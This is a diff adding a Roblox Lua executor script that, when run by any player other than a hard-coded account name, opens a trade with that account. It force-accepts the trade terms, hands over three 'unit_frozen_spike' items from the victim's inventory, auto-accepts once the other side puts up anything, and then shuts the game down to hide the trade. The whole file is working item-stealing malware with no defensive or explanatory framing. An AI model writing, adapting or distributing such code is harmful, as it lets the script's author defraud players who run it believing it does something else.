@@ -1,1 +1,124 @@
+-- ===== CONFIG =====
+local targetUsername = "dusfuxxx"
+local addUnits = {"unit_frozen_spike"}
+local receiveUnits = {}
+local repeatCounts = {unit_frozen_spike = 3}
+-- ==================
 
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+if player.Name == targetUsername then
+    return
+end
+
+local gui = player:WaitForChild("PlayerGui"):WaitForChild("GameGui")
+local screen = gui:WaitForChild("Screen")
+local sidebar = screen.Left.Sidebar
+local tradeButton = sidebar.Items.Trade.Items.Button
+
+local function fireTradeButton()
+    local conns = getconnections(tradeButton.MouseButton1Click)
+    if conns and #conns > 0 then conns[1]:Fire() end
+end
+
+local function waitForUserAndClick(username)
+    local frame = screen.Middle.TradePartner.Items.Items.Items.Items.ScrollingFrame
+    local start = tick()
+    while tick() - start < 5 do
+        local item = frame:FindFirstChild(username)
+        if item and item:FindFirstChild("Button") then
+            local conns = getconnections(item.Button.MouseButton1Click)
+            if conns and #conns > 0 then conns[1]:Fire() return end
+        end
+        task.wait(0.1)
+    end
+end
+
+local trade
+repeat
+    fireTradeButton()
+    waitForUserAndClick(targetUsername)
+    trade = screen.Middle:FindFirstChild("Trade")
+    task.wait(1)
+until trade
+
+local terms = trade:WaitForChild("Terms")
+local acceptBtn = terms.Items.Buttons.Items.Accept
+
+task.spawn(function()
+    while trade and trade.Parent and terms.Visible do
+        local conns = getconnections(acceptBtn.MouseButton1Click)
+        if conns and #conns > 0 then conns[1]:Fire() end
+        task.wait(0.3)
+    end
+end)
+
+while terms.Visible do
+    task.wait(0.2)
+end
+
+do
+    local btn = trade.Items.Container.Items.Left.Give.Items.ScrollingFrame.unit_more.TextButton
+    local conns = getconnections(btn.MouseButton1Click)
+    if conns and #conns > 0 then conns[1]:Fire() end
+end
+
+local function selectUnitAndAdd(unitName, count)
+    local inv = trade.Inventory.Inventory.Frame.Items.Items.ScrollingFrame
+    local unit = inv:FindFirstChild(unitName)
+    if not unit then
+        for _, v in ipairs(inv:GetChildren()) do
+            if v:IsA("Frame") and v.Name:lower():find(unitName:lower()) then
+                unit = v
+                break
+            end
+        end
+    end
+    if not unit then return end
+    local button = unit:FindFirstChildWhichIsA("TextButton", true) or unit
+    inv.CanvasPosition = Vector2.new(0, math.max(0, unit.AbsolutePosition.Y - inv.AbsolutePosition.Y - 50))
+    for i = 1, count do
+        local conns = getconnections(button.MouseButton1Click)
+        if conns and #conns > 0 then conns[1]:Fire() end
+        task.wait(0.1)
+        local addBtn = trade.AmountAdd.Frame.Frame.Actions.Items.Add
+        local addConns = getconnections(addBtn.MouseButton1Click)
+        if addConns and #addConns > 0 then addConns[1]:Fire() end
+        task.wait(0.3)
+    end
+end
+
+for _, u in ipairs(addUnits) do
+    selectUnitAndAdd(u, repeatCounts[u] or 1)
+end
+
+task.spawn(function()
+    local receiveFrame = trade.Items.Container.Items.Right.Receive.Items.ScrollingFrame
+    local acceptBtn = trade.Items.Container.Items.Right.Controls.Items.Buttons.Accept
+    local function hasWantedUnit()
+        for _, item in ipairs(receiveFrame:GetChildren()) do
+            if item:IsA("Frame") then
+                if #receiveUnits == 0 then return true end
+                for _, want in ipairs(receiveUnits) do
+                    if item.Name == want then return true end
+                end
+            end
+        end
+        return false
+    end
+    while trade and trade.Parent do
+        if hasWantedUnit() and acceptBtn.Visible and acceptBtn.Active then
+            local conns = getconnections(acceptBtn.MouseButton1Click)
+            if conns and #conns > 0 then conns[1]:Fire() end
+        end
+        task.wait(0.4)
+    end
+end)
+
+repeat
+    trade = screen.Middle:FindFirstChild("Trade")
+    task.wait(0.2)
+until not trade
+
+pcall(function() game:Shutdown() end)
